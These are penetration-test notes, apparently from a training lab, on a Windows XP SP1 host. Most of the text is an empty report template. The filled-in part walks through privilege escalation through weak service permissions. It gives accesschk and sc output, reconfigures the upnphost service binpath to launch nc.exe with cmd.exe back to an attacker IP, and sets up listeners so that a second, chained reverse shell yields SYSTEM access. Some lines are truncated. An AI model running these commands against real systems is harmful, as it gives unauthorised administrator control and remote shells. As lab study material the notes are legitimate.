# Summary
# Location
- IP Address: 10.11.1.14
## System Information
- OS: Microsoft Windows XP Professional
- Kernal: 5.1.2600 Service Pack 1 Build 2600
- Hostname: bob
- DomainName: 
- Domain Sid: 
- DNS: 
## Vulnerabilities & Attack Vectors
- Exploit 1
- Exploit 2
- Exploit 3
## Post Exploitation
- Proof
## Credentials
### OS
- uri:
- username:
- password:

## System Setup
- ICMP: Enalbed/Disabled
- Firewall: Enabled/Disabled. Will respond to ICMP?
- Essential Services: XXX (TCP XXX)
- Platform:

## Notes

# Service Enumeration
## Port Scan (Nmap)

## Key Infomation
The Nmap version scan identifies an interesting potential entrypoint, in this case, we should focus on th


Microsoft-IIS/5.1

# Exploitation
## Exploit 1
- Title: 
- CVE: 
- EBD-ID: 
- Link: 

## Exploit 2
- Title: 
- CVE:
- EBD-ID: 
- Link: 

## Exploit 3
https://sohvaxus.github.io/content/winxp-sp1-privesc.html

upload accesschk.exe

C:\Inetpub\wwwroot>accesschk.exe /accepteula -uwcqv "Authenticated Users" *
accesschk.exe /accepteula -uwcqv "Authenticated Users" *
RW SSDPSRV
        SERVICE_ALL_ACCESS
RW upnphost
        SERVICE_ALL_ACCESS


# SSDPSRV
C:\Inetpub\wwwroot>accesschk.exe /accepteula -ucqv SSDPSRV
accesschk.exe /accepteula -ucqv SSDPSRV
SSDPSRV
  RW NT AUTHORITY\SYSTEM
        SERVICE_ALL_ACCESS
  RW BUILTIN\Administrators
        SERVICE_ALL_ACCESS
  RW NT AUTHORITY\Authenticated Users
        SERVICE_ALL_ACCESS
  RW BUILTIN\Power Users
        SERVICE_ALL_ACCESS
  RW NT AUTHORITY\LOCAL SERVICE
        SERVICE_ALL_ACCESS

# upnphost
C:\Inetpub\wwwroot>accesschk.exe /accepteula -ucqv upnphost
accesschk.exe /accepteula -ucqv upnphost
upnphost
  RW NT AUTHORITY\SYSTEM
        SERVICE_ALL_ACCESS
  RW BUILTIN\Administrators
        SERVICE_ALL_ACCESS
  RW NT AUTHORITY\Authenticated Users
        SERVICE_ALL_ACCESS
  RW BUILTIN\Power Users
        SERVICE_ALL_ACCESS
  RW NT AUTHORITY\LOCAL SERVICE
        SERVICE_ALL_ACCESS


# SSDPSRV config
C:\Inetpub\wwwroot>sc qc SSDPSRV
sc qc SSDPSRV
[SC] GetServiceConfig SUCCESS

SERVICE_NAME: SSDPSRV
        TYPE               : 20  WIN32_SHARE_PROCESS 
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\inetpub\nc.exe -192.168.119.163 6969 -e C:\WINDOWS\System32\cmd.exe  
        LOAD_ORDER_GROUP   :   
        TAG                : 0  
        DISPLAY_NAME       : SSDP Discovery Service  
        DEPENDENCIES       :   
        SERVICE_START_NAME : NT AUTHORITY\LocalService

# upnphost config
C:\Inetpub\wwwroot>sc qc upnphost
sc qc upnphost
[SC] GetServiceConfig SUCCESS

SERVICE_NAME: upnphost
        TYPE               : 20  WIN32_SHARE_PROCESS 
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\inetpub\nc.exe -nv 192.168.119.163 6969 -e C:\WINDOWS\System32\cmd.exe  
        LOAD_ORDER_GROUP   :   
        TAG                : 0  
        DISPLAY_NAME       : Universal Plug and Play Device Host  
        DEPENDENCIES       : SSDPSRV  
        SERVICE_START_NAME : LocalSystem


# SSDPSRV status
C:\Inetpub\wwwroot>sc query SSDPSRV
sc query SSDPSRV

SERVICE_NAME: SSDPSRV
        TYPE               : 20  WIN32_SHARE_PROCESS 
        STATE              : 1  STOPPED 
                                (NOT_STOPPABLE,NOT_PAUSABLE,IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0



# Set SSDPSRV to AUTOMATIC
# NOTE: There is a space between = and auto. This is important, else the command will fail.								
								
C:\> sc config SSDPSRV start= auto
[SC] ChangeServiceConfig SUCCESS
								
# Double check if it's set to AUTOMATIC (or AUTO_START)
								
C:\> sc qc SSDPSRV
[SC] GetServiceConfig SUCCESS

SERVICE_NAME: SSDPSRV
        TYPE               : 20  WIN32_SHARE_PROCESS 
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\WINDOWS\System32\svchost.exe -k LocalService  
        LOAD_ORDER_GROUP   :   
        TAG                : 0  
        DISPLAY_NAME       : SSDP Discovery Service   
        DEPENDENCIES       :   
        SERVICE_START_NAME : NT AUTHORITY\LocalService	

# Start SSDPSRV Server
C:\> net start SSDPSRV
The SSDP Discovery Service service is starting.
The SSDP Discovery Service service was started successfully.	



et new binary path (don't forget the space after binpath=)                          
# Syntax
C:\> sc config upnphost binpath= "C:\nc.exe -nv [ip] [port] -e C:\WINDOWS\System32\cmd.exe"


# Example
sc config upnphost binpath= "C:\inetpub\wwwroot\nc.exe -e cmd.exe 192.168.45.229 5555"
[SC] ChangeServiceConfig SUCCESS
                                
# Set obj and password
C:\> sc config upnphost obj= ".\LocalSystem" password= "
[SC] ChangeServiceConfig SUCCESS



# Check the service status again
sc qc upnphost

# In Attacker

nc -lvnp 5555

# Start the service
net start upnphost

We will get the Administrator shell, but after a few seconds, the service will stop, and our shell will be dead.

So we could start 2 nc listen. One is like the old 5555, the new one listen the port 6666.

Once 5555 got the reverse shell, we use nc.exe start a new reverse shell to our machine's port 6666.

The 6666 shell will be stable enough to get the proof.txt







- Title:
- CVE:
- Link:
